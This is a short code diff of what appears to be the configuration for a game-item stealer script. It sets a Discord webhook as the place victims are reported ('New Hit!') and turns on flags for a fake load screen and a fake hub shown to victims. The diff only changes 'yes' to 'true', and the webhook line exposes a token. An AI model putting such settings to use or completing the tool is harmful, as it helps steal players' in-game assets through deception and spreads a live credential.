@@ -4,9 +4,9 @@ Webhook = "https://discord.com/api/webhooks/1191098819643977799/JuDnsEKJLnw3XXyl
 
 Mailmsg = "New Hit!"
 
-FakeLoadScreen = yes
+FakeLoadScreen = true
 
-Fake_Hub_If_Not_Enough_Gems = yes
+Fake_Hub_If_Not_Enough_Gems = true
 
 
 
